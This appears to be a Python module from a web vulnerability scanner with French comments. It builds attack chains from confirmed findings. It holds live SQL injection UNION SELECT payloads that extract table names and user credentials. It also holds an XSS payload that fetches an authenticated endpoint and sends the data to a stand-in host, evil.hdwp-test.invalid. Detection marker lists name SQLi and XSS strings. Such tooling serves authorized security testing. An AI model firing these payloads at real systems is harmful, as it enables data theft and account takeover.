# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.

"""Règles de génération de chaînes d'attaque à partir de findings confirmés corrélés.

Architecture non-hardcodée : les capacités d'attaque sont dérivées depuis la structure
de la preuve (winning_request, diffs, passive_tags) et la catégorie OWASP du finding,
sans jamais référencer un CWE spécifique dans les règles de corrélation.
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING, Any
from urllib.parse import urlparse

from hdwp.core.model.schemas import (
    ChainSpec,
    ChainStep,
    FlowEdge,
    NormalizedRequest,
    generate_id,
)

if TYPE_CHECKING:
    from hdwp.core.model.schemas import Finding

MAX_PIVOT_CHAINS = 10


# ── Prédicats sémantiques (sans référence CWE) ───────────────────────────────

def _is_active(f: Finding) -> bool:
    """Faille avec requête exploitable — peut être déclenchée par HTTP."""
    return bool((f.proof or {}).get("winning_request"))


def _is_injection_capable(f: Finding) -> bool:
    """Faille d'injection : données contrôlées par l'attaquant atteignent un interpréteur."""
    return _is_active(f) and (f.owasp_category or "").startswith("A03")


def _wr_params(wr: dict) -> dict:
    """Fusionne query_params et body (si dict) de façon sûre."""
    body = wr.get("body")
    body_dict = body if isinstance(body, dict) else {}
    return {**wr.get("query_params", {}), **body_dict}


def _is_sql_injection(f: Finding) -> bool:
    """Injection SQL : preuve contient des marqueurs SQL dans les paramètres."""
    proof = f.proof or {}
    wr = proof.get("winning_request") or {}
    params = _wr_params(wr)
    return _is_injection_capable(f) and any(
        any(m in str(v) for m in ("'", "UNION", "--", "SELECT", "OR 1=1", "SLEEP", "WAITFOR"))
        for v in params.values()
    )


def _is_xss_injection(f: Finding) -> bool:
    """XSS : preuve contient des payloads JavaScript dans les paramètres."""
    proof = f.proof or {}
    wr = proof.get("winning_request") or {}
    params = _wr_params(wr)
    return _is_injection_capable(f) and any(
        any(m in str(v) for m in ("<script", "onerror=", "javascript:", "alert(", "prompt("))
        for v in params.values()
    )


def _is_access_bypass(f: Finding) -> bool:
    """Contrôle d'accès défaillant : accès à des ressources non autorisées."""
    return _is_active(f) and (f.owasp_category or "").startswith("A01")


def _has_id_param(f: Finding) -> bool:
    """Le finding manipule un paramètre de type ID (numérique ou UUID).

    Distingue les failles BOLA (manipulation d'objet via ID) des autres A01
    comme path_traversal ou open_redirect.
    """
    proof = f.proof or {}
    wr = proof.get("winning_request") or {}
    params = _wr_params(wr)
    # Chercher valeurs numériques, UUIDs, ou params nommés *id*
    id_value_re = re.compile(r"^\d+$|^[0-9a-f-]{36}$", re.IGNORECASE)
    param_name_re = re.compile(r"\bid\b|_id$|Id$", re.IGNORECASE)
    return any(
        param_name_re.search(k) or id_value_re.match(str(v))
        for k, v in params.items()
    ) or any(
        param_name_re.search(seg)
        for seg in urlparse(wr.get("url", "")).path.split("/")
    )


def _is_auth_weak(f: Finding) -> bool:
    """Faiblesse d'authentification : peut compromettre une session ou identité."""
    return _is_active(f) and (
        (f.owasp_category or "").startswith("A02") or
        (f.owasp_category or "").startswith("A07")
    )


def _is_lateral_capable(f: Finding) -> bool:
    """Mouvement latéral : peut atteindre d'autres ressources ou origines.

    Couvre SSRF (A10), CORS (A05 — misconfiguration permettant cross-origin),
    et redirections ouvertes (tag proof).
    """
    owasp = f.owasp_category or ""
    return _is_active(f) and (
        owasp.startswith("A10") or   # SSRF
        owasp.startswith("A05") or   # CORS + misconfigurations d'accès cross-origin
        any("redirect" in (t or "") for t in (f.proof or {}).get("passive_tags", []))
    )


def _is_precondition_only(f: Finding) -> bool:
    """Précondition passive : amplifie le risque mais pas un vecteur exploitable seul."""
    proof = f.proof or {}
    return (
        bool(proof.get("passive_tags")) and
        not proof.get("winning_request") and
        not proof.get("diffs")
    )


# ── Prédicats sémantiques (détection via proof.mutation_type) ────────────────

def _get_mutation_type(f: Finding) -> str:
    """Extrait mutation_type du proof (source de vérité sémantique)."""
    proof = f.proof or {}
    return proof.get("mutation_type", "")


def _is_sql_injection_semantic(f: Finding) -> bool:
    """SQLi via CWE-89 ou mutation_type.

    Note: proof ne contient pas "experiment_spec" — seuls mutation_type et cwe_id
    sont fiables comme indicateurs sémantiques. mutation_type="field_injection"
    avec CWE-89 est le cas canonique SQLi dans HDWP.
    """
    if not _is_active(f):
        return False
    mutation_type = _get_mutation_type(f)
    return (
        f.cwe_id == "CWE-89" or
        "sql" in mutation_type.lower() or
        "injection" in mutation_type.lower()
    )


def _has_id_param_semantic(f: Finding) -> bool:
    """Détecte manipulation d'ID via mutation_params.parameter_name."""
    proof = f.proof or {}
    exp_spec = proof.get("experiment_spec", {})
    if isinstance(exp_spec, dict):
        params = exp_spec.get("mutation_params", {})
        if isinstance(params, dict):
            param_name = params.get("parameter_name", "")
            if re.search(r"\bid\b|_id$|Id$", param_name, re.IGNORECASE):
                return True
    # Fallback sur logique existante
    return _has_id_param(f)


# ── Helpers de construction de requêtes ──────────────────────────────────────

def _winning_url(finding: Finding, target_url: str = "") -> str:
    """Retourne l'URL depuis winning_request ou affected_endpoints."""
    proof = finding.proof or {}
    wr = proof.get("winning_request")
    if isinstance(wr, dict) and wr.get("url"):
        return wr["url"]
    if finding.affected_endpoints:
        url = finding.affected_endpoints[0]
        if url.startswith("http"):
            return url
        if target_url:
            p = urlparse(target_url)
            return f"{p.scheme}://{p.netloc}{url}"
    return ""


def _base_path(url: str) -> str:
    """Retourne le chemin de base sans query string ni fragment."""
    return urlparse(url).path.rstrip("/") or "/"


def _build_request(finding: Finding) -> dict:
    """Reconstruit une NormalizedRequest depuis proof.winning_request."""
    wr = (finding.proof or {}).get("winning_request") or {}
    return {
        "method": wr.get("method", "GET"),
        "url": wr.get("url") or (finding.affected_endpoints[0] if finding.affected_endpoints else ""),
        "headers": wr.get("headers") or {},
        "body": wr.get("body"),
        "query_params": wr.get("query_params") or {},
        "path_params": wr.get("path_params") or {},
    }


def _infer_extractors(finding: Finding) -> dict[str, str]:
    """Heuristique générique : extraire les clés courantes de la réponse."""
    wr = (finding.proof or {}).get("winning_request") or {}
    params = list(_wr_params(wr).keys())
    key = params[0] if params else "result"
    return {key: key, "id": "id", "token": "token", "data": "0"}


def _infer_injections(finding: Finding) -> dict[str, str]:
    """Heuristique : injecter le contexte dans le premier paramètre vulnérable."""
    wr = (finding.proof or {}).get("winning_request") or {}
    params = list(_wr_params(wr).keys())
    return {params[0]: "id"} if params else {}


# ── Règles existantes refactorisées ──────────────────────────────────────────

def rule_bola_escalation(
    findings: list[Finding],
    model: Any,
    target_url: str = "",
) -> list[ChainSpec]:
    """Contrôle d'accès par manipulation d'ID → escalade vers d'autres objets.

    Cible les failles A01 qui manipulent un identifiant numérique ou UUID,
    pour éviter de confondre avec path_traversal ou open_redirect.
    """
    access_bypass_findings = [f for f in findings if _is_access_bypass(f) and _has_id_param_semantic(f)]
    if not access_bypass_findings:
        return []

    relations = getattr(model, "relations", [])
    flow_edges = [FlowEdge.model_validate(r) if isinstance(r, dict) else r for r in relations]

    chains = []
    for finding in access_bypass_findings[:2]:
        vuln_url = _winning_url(finding, target_url)
        if not vuln_url:
            continue

        source_url = ""
        id_field = "id"
        for edge in flow_edges:
            if edge.params_transferred and any(
                p in ("id", "user_id", "userId") for p in edge.params_transferred
            ):
                source_url = edge.from_endpoint
                id_field = edge.params_transferred[0]
                break

        if not source_url:
            p = urlparse(vuln_url)
            base = f"{p.scheme}://{p.netloc}"
            source_url = f"{base}/api/users/me"

        step0 = ChainStep(
            step_index=0,
            request=NormalizedRequest(method="GET", url=source_url, headers={},
                                       body=None, query_params={}, path_params={}),
            role_name="anonymous",
            context_extractors={id_field: id_field},
        )
        step1 = ChainStep(
            step_index=1,
            request=NormalizedRequest(method="GET", url=vuln_url, headers={},
                                       body=None, query_params={}, path_params={}),
            role_name="anonymous",
            inject_context={"id": id_field},
        )
        chains.append(ChainSpec(
            id=generate_id("CHN"),
            chain_type="bola_escalation",
            steps=[step0, step1],
            precondition_finding_ids=[finding.id],
            description=f"Escalade d'accès via {finding.affected_endpoints[0] if finding.affected_endpoints else '?'}",
        ))
    return chains


def rule_sqli_exfil(
    findings: list[Finding],
    model: Any,
    flow_map: Any,
    target_url: str = "",
) -> list[ChainSpec]:
    """SQL injection détectée → extraction de données DB via UNION SELECT."""
    sqli_findings = [f for f in findings if _is_sql_injection_semantic(f)]
    if not sqli_findings:
        return []

    db_tables = getattr(flow_map, "db_tables", []) if flow_map else []
    # Continuer même si db_tables est vide (génération générique ci-dessous)

    chains = []
    for finding in sqli_findings[:1]:
        vuln_url = _winning_url(finding, target_url)
        if not vuln_url:
            continue

        proof = finding.proof or {}
        wr = proof.get("winning_request") or {}
        params = wr.get("query_params") or {}
        param_name = next(iter(params), "q") if params else "q"

        if db_tables:
            target_table = next(
                (t for t in db_tables
                 if any(c.name.lower() in ("password", "email", "token", "username")
                        for c in getattr(t, "columns", []))),
                db_tables[0],
            )
            pk_col = next((c.name for c in getattr(target_table, "columns", []) if c.is_pk), "id")
            table_name = getattr(target_table, "name", "users")
            step1_payload = f"1 UNION SELECT {pk_col},email FROM {table_name}--"  # nosec B608
            description = f"Extraction DB depuis '{table_name}' via injection SQL"
        else:
            # Fallback générique sans schéma connu
            step1_payload = "1 UNION SELECT username,password FROM users--"
            description = "Extraction DB générique via injection SQL (schéma inconnu)"

        step0 = ChainStep(
            step_index=0,
            request=NormalizedRequest(
                method="GET", url=vuln_url, headers={}, body=None,
                query_params={param_name: "1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 5--"},
                path_params={},
            ),
            role_name="anonymous",
            context_extractors={"tables": "0"},
        )
        step1 = ChainStep(
            step_index=1,
            request=NormalizedRequest(
                method="GET", url=vuln_url, headers={}, body=None,
                query_params={param_name: step1_payload},
                path_params={},
            ),
            role_name="anonymous",
            context_extractors={"extracted_rows": "0"},
        )
        chains.append(ChainSpec(
            id=generate_id("CHN"),
            chain_type="sqli_exfil",
            steps=[step0, step1],
            precondition_finding_ids=[finding.id],
            description=description,
        ))
    return chains


def rule_jwt_privesc(
    findings: list[Finding],
    model: Any,
    target_url: str = "",
) -> list[ChainSpec]:
    """Faiblesse d'authentification + contrôle d'accès → accès admin via token forgé."""
    auth_findings = [f for f in findings if _is_auth_weak(f)]
    access_findings = [f for f in findings if _is_access_bypass(f)]
    if not auth_findings or not access_findings:
        return []

    priv_url = _winning_url(access_findings[0], target_url)
    if not priv_url:
        return []

    relations = getattr(model, "relations", [])
    login_url = ""
    for r in relations:
        edge = FlowEdge.model_validate(r) if isinstance(r, dict) else r
        if edge.trigger == "fsm" and "token" in edge.params_transferred:
            p = urlparse(priv_url)
            login_url = f"{p.scheme}://{p.netloc}{edge.from_endpoint}"
            break

    if not login_url and target_url:
        p = urlparse(target_url)
        login_url = f"{p.scheme}://{p.netloc}/api/auth/login"

    step0 = ChainStep(
        step_index=0,
        request=NormalizedRequest(
            method="POST", url=login_url, headers={},
            body={"username": "test", "password": "test"},
            query_params={}, path_params={},
        ),
        role_name="anonymous",
        context_extractors={"jwt": "token"},
    )
    step1 = ChainStep(
        step_index=1,
        request=NormalizedRequest(
            method="GET", url=priv_url, headers={},
            body=None, query_params={}, path_params={},
        ),
        role_name="anonymous",
        inject_context={"header:Authorization": "jwt"},
    )
    return [ChainSpec(
        id=generate_id("CHN"),
        chain_type="jwt_privesc",
        steps=[step0, step1],
        precondition_finding_ids=[auth_findings[0].id, access_findings[0].id],
        description="Faiblesse d'auth + escalade vers endpoint privilégié",
    )]


def rule_cors_xss(
    findings: list[Finding],
    model: Any,
    flow_map: Any,
    target_url: str = "",
) -> list[ChainSpec]:
    """Mauvaise config CORS + XSS → vol de credentials cross-origine."""
    lateral_findings = [f for f in findings if _is_lateral_capable(f)]
    xss_findings = [f for f in findings if _is_xss_injection(f)]
    if not lateral_findings or not xss_findings:
        return []

    exfil_risks = getattr(flow_map, "exfiltration_risks", []) if flow_map else []
    xss_url = _winning_url(xss_findings[0], target_url)
    if not xss_url:
        return []

    target_endpoint = exfil_risks[0] if exfil_risks else "/api/users/me"
    if not target_endpoint.startswith("http") and target_url:
        p = urlparse(target_url)
        target_endpoint = f"{p.scheme}://{p.netloc}{target_endpoint}"

    xss_payload = (
        f"<script>fetch('{target_endpoint}',{{credentials:'include'}})"
        f".then(r=>r.json()).then(d=>fetch('https://evil.hdwp-test.invalid/c?d='+btoa(JSON.stringify(d))))"
        f"</script>"
    )
    proof = xss_findings[0].proof or {}
    wr = proof.get("winning_request") or {}
    params = wr.get("query_params") or {}
    xss_param = next(iter(params), "q")

    step0 = ChainStep(
        step_index=0,
        request=NormalizedRequest(
            method="GET", url=xss_url, headers={}, body=None,
            query_params={xss_param: xss_payload},
            path_params={},
        ),
        role_name="anonymous",
        context_extractors={"xss_injected": "0"},
    )
    step1 = ChainStep(
        step_index=1,
        request=NormalizedRequest(
            method="GET", url=target_endpoint, headers={},
            body=None, query_params={}, path_params={},
        ),
        role_name="anonymous",
        context_extractors={"sensitive_data": "email"},
    )
    return [ChainSpec(
        id=generate_id("CHN"),
        chain_type="cors_xss",
        steps=[step0, step1],
        precondition_finding_ids=[lateral_findings[0].id, xss_findings[0].id],
        description=f"CORS misconfiguration + XSS → exfiltration depuis {target_endpoint}",
    )]


# ── Nouvelles règles génériques ───────────────────────────────────────────────

def rule_generic_active_chain(
    findings: list[Finding],
    model: Any,
    target_url: str = "",
) -> list[ChainSpec]:
    """Fallback : génère des chaînes pour TOUTE paire de findings actifs HIGH/CRITICAL.

    Garantit qu'au moins QUELQUES chaînes exécutables apparaissent même si les règles
    spécifiques ne matchent pas. Indispensable pour éviter que seules les chaînes
    théoriques (precondition_cluster) soient détectées.
    """
    active = [f for f in findings if _is_active(f) and f.severity in ("CRITICAL", "HIGH", "MEDIUM")]
    if len(active) < 2:
        return []

    chains = []
    seen = set()
    for i, f1 in enumerate(active[:5]):  # Max 5 sources
        for f2 in active[i+1:i+4]:  # Max 3 cibles par source
            pair = frozenset([f1.id, f2.id])
            if pair in seen:
                continue
            seen.add(pair)

            url1 = _winning_url(f1, target_url)
            url2 = _winning_url(f2, target_url)
            if not url1 or not url2:
                continue
            # Skip si même chemin de base
            if _base_path(url1) == _base_path(url2):
                continue

            chains.append(ChainSpec(
                id=generate_id("CHN"),
                chain_type="generic_active_chain",
                steps=[
                    ChainStep(
                        step_index=0,
                        request=NormalizedRequest(**_build_request(f1)),
                        role_name="anonymous",
                        context_extractors=_infer_extractors(f1),
                    ),
                    ChainStep(
                        step_index=1,
                        request=NormalizedRequest(**_build_request(f2)),
                        role_name="anonymous",
                        inject_context=_infer_injections(f2),
                    ),
                ],
                precondition_finding_ids=[f1.id, f2.id],
                description=f"Chaîne générique : {f1.cwe_id} → {f2.cwe_id} sur chemins distincts",
                executable=True,
            ))
    return chains


def rule_active_pivot(
    findings: list[Finding],
    model: Any,
    target_url: str = "",
) -> list[ChainSpec]:
    """Pivots génériques entre failles actives HIGH/CRITICAL sur chemins distincts.

    Fonctionne pour toute combinaison de findings actifs sans référence aux CWE.
    Sources : findings HIGH/CRITICAL avec requête exploitable.
    Cibles : tous findings actifs sur un chemin différent.
    """
    sources = [f for f in findings if _is_active(f) and f.severity in ("CRITICAL", "HIGH")]
    targets = [f for f in findings if _is_active(f)]

    specs: list[ChainSpec] = []
    seen_pairs: set[frozenset] = set()

    for a in sources:
        for b in targets:
            if len(specs) >= MAX_PIVOT_CHAINS:
                return specs
            if a.id == b.id:
                continue
            url_a = _winning_url(a, target_url)
            url_b = _winning_url(b, target_url)
            if not url_a or not url_b:
                continue
            if _base_path(url_a) == _base_path(url_b):
                continue
            pair = frozenset([a.id, b.id])
            if pair in seen_pairs:
                continue
            seen_pairs.add(pair)

            cat_a = (a.owasp_category or "X")[:3].lower()
            cat_b = (b.owasp_category or "X")[:3].lower()
            specs.append(ChainSpec(
                id=generate_id("CHN"),
                chain_type=f"pivot_{cat_a}_{cat_b}",
                steps=[
                    ChainStep(
                        step_index=0,
                        request=NormalizedRequest(**_build_request(a)),
                        role_name="anonymous",
                        context_extractors=_infer_extractors(a),
                    ),
                    ChainStep(
                        step_index=1,
                        request=NormalizedRequest(**_build_request(b)),
                        role_name="anonymous",
                        inject_context=_infer_injections(b),
                    ),
                ],
                precondition_finding_ids=[a.id, b.id],
                description=(
                    f"Pivot {a.owasp_category} → {b.owasp_category} : "
                    f"exploiter {_base_path(url_a)} pour atteindre {_base_path(url_b)}"
                ),
            ))
    return specs


def rule_precondition_chain(
    findings: list[Finding],
    model: Any,
    target_url: str = "",
) -> list[ChainSpec]:
    """Groupe les préconditions passives en chaîne théorique non exécutable.

    Ces clusters révèlent des conditions favorables à une attaque active
    mais ne constituent pas un vecteur exploitable seul.
    """
    passives = [f for f in findings if _is_precondition_only(f)]
    if len(passives) < 2:
        return []

    by_ep: dict[str, list[Finding]] = {}
    for f in passives:
        for ep in (f.affected_endpoints or [""]):
            by_ep.setdefault(ep, []).append(f)

    specs: list[ChainSpec] = []
    for ep, ep_findings in by_ep.items():
        deduped = list({f.cwe_id: f for f in ep_findings}.values())
        if len(deduped) < 2:
            continue
        tags = [t for f in deduped for t in (f.proof or {}).get("passive_tags", [])]
        specs.append(ChainSpec(
            id=generate_id("CHN"),
            chain_type="precondition_cluster",
            steps=[],
            precondition_finding_ids=[f.id for f in deduped],
            description=(
                f"Cluster de préconditions sur {ep} : {', '.join(tags[:4])}. "
                f"Ces failles combinées amplifient le risque si un vecteur actif (A01/A03) est présent."
            ),
            executable=False,
            missing_preconditions=[
                "Faille active (injection ou contrôle d'accès) sur le même domaine pour concrétiser l'attaque"
            ],
        ))
    return specs
